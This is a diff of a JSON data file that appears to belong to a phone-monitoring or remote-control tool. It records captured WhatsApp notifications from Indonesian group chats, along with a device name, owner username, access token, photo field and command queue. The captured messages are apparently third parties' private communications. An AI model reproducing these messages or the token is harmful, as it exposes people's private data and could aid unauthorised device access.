@@ -22,6 +22,38 @@
     "smsMessages": [
       {
         "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎1117 pesan dari 17 chat",
+        "time": "29/04 21:03",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777467148220
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎𝐒𝐓𝐌 𝐒𝐔𝐒𝐔 𝐃𝐀𝐍𝐂𝐀𝐖𝟕𝟕𝟕 ᵛ¹ (38 pesan): ~ George",
+        "content": "gw mancing nyari duit cung 😂",
+        "time": "29/04 21:03",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777467148191
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "‎𝘼𝙈𝘽𝘼𝙇𝙄𝙂𝙃𝙏𝙉𝙄𝙉𝙂⚡ (150 pesan): ~ ·–/––·/··–/···",
+        "content": "💟 Stiker",
+        "time": "29/04 21:03",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777467144314
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎1116 pesan dari 17 chat",
+        "time": "29/04 21:03",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777467143162
+      },
+      {
+        "appName": "WhatsApp",
         "sender": "‎𝐓𝐚𝐠 𝐬𝐰 𝟑 (338 pesan): ~ 𝔥𝔞𝔞𝔞 𝔰𝔱𝔢𝔳𝔲𝔲𝔲",
         "content": "Menyebut grup Anda secara privat di status",
         "time": "29/04 21:03",
@@ -3987,38 +4019,6 @@
         "time": "29/04 20:54",
         "pkg": "com.whatsapp",
         "receivedAt": 1777466622772
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎𝐓𝐚𝐠 𝐬𝐰 𝟑 (330 pesan): ~ ~?",
-        "content": "Menyebut grup Anda secara privat di status",
-        "time": "29/04 20:54",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777466619279
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎𝟐𝟐𝟓 𝐀𝐑𝐄𝐀 (43 pesan): ~ komar mania",
-        "content": "lu semua kacunk",
-        "time": "29/04 20:54",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777466619204
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎TWOSTROKE JATIM V1 (22 pesan): ~ Rid",
-        "content": "Menyebut grup Anda secara privat di status",
-        "time": "29/04 20:54",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777466619147
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎𝐉𝐁 𝟒 ||  𝐊𝐈𝐍𝐆 𝐕𝐀𝐋𝐙  ✨ (75 pesan): ~ NO WEAK🫪",
-        "content": "Yang mau dajed pm!!\nYang mau dajed pm!!\nYang mau dajed pm!!\nYang mau dajed pm!!\nYang mau dajed pm!!\nYang mau dajed pm!!\nYang mau dajed pm!!",
-        "time": "29/04 20:54",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777466618970
       }
     ],
     "galleryPhotos": [],
@@ -4069,7 +4069,7 @@
     "deviceName": "HP-AGUSGANTENG123-3E9A",
     "ownerUsername": "zaa",
     "token": "20fdcadc903f75b92eda3edefa92e509",
-    "lastSeen": 1777467142174,
+    "lastSeen": 1777467148178,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-27T07:37:12.639Z",
